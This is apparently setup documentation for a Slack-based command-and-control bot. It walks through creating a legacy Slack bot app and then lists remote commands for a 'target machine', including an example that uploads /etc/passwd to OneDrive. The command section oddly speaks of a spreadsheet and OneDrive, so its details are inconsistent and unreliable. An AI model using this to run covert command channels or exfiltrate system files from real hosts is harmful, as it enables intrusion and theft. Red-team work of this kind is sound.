# Slack C2 Bot Setup

## Requirements

- Slack account w/ permissions to create a Slack App
- Slack workspace

## Creating the Slack App

1. To create a legacy app that uses RTM go to the following link:
  <https://api.slack.com/apps?new_classic_app=1>

1. If you have a workspace created it will take you to a page with a "Create a Slack App (Classic) box.
  Give you app a name.

1. Select the Workspace you want to host it in
 [image.png](https://raw.githubusercontent.com/TechRinger/media/main/images/image_1690913220627_0.png)

1. Select Bots
 [image.png](https://raw.githubusercontent.com/TechRinger/media/main/images/image_1690913749185_0.png)

1. Select Add Legacy Bot User
 [image.png](https://raw.githubusercontent.com/TechRinger/media/main/images/image_1690913799922_0.png)

1. Fill in your App info and click Add
 ![image.png](https://raw.githubusercontent.com/TechRinger/media/main/images/image_1690913871192_0.png)

1. Click Basic Information, then Install to Workspace
  ![image.png](https://raw.githubusercontent.com/TechRinger/media/main/images/image_1690913974417_0.png)

1. Click Allow on the Bot App
  ![image.png](https://raw.githubusercontent.com/TechRinger/media/main/images/image_1690914005675_0.png)

1. Scroll down to Oauth & Permissions and copy Token and keep it handy, we'll use it later in the bot config
  ![image.png](https://raw.githubusercontent.com/TechRinger/media/main/images/image_1690914500790_0.png)

1. Under Settings > Basic Information > Building Apps for Slack if there isn't a green checkmark, click on "Install your app" and click Install to Workspace
  ![image.png](https://raw.githubusercontent.com/TechRinger/media/main/images/image_1690915501124_0.png)

## Adding the Slack App

1. Create a Channel or select the channel you want to add it to and Select "View channel details"
  ![image.png](https://raw.githubusercontent.com/TechRinger/media/main/images/image_1690916630739_0.png)

1. Select Integrations > Add apps
  ![image.png](https://raw.githubusercontent.com/TechRinger/media/main/images/image_1690916695637_0.png)

1. Click on Add next to the app you created
  ![image.png](https://raw.githubusercontent.com/TechRinger/media/main/images/image_1690916747338_0.png)

1. Setup is complete (You should see a message stating your app was added to the channel)
  ![image.png](https://raw.githubusercontent.com/TechRinger/media/main/images/image_1690916837872_0.png)

## Command execution

1. The program will perform a request to the spreedsheet every 30 sec (by default) to check for new commands.

1. Enter the command in column **A** and the output will be added to column **B**

### Upload File

**NOTE**  
"upload" is the string configured in the bot config file.

The "upload" command will upload a file from the target machine to OneDrive.  The syntax is:

 ```none

upload;<remote path>
 ```

Example:

 ```none
upload;/etc/passwd
 ```

**NOTE**  
DO **NOT** add spaces around semi-colons.

### Download File

**NOTE**  
"download" is the string configured in the bot config file.

The "download" command will download a file from OneDrive to the target machine.  The syntax is:

 ```none
download;<OneDrive file name>;<remote path>
 ```

Example:

 ```none
download;down.txt;/home/user/downloaded.txt
 ```

**NOTE**  
DO **NOT** add spaces around semi-colons.
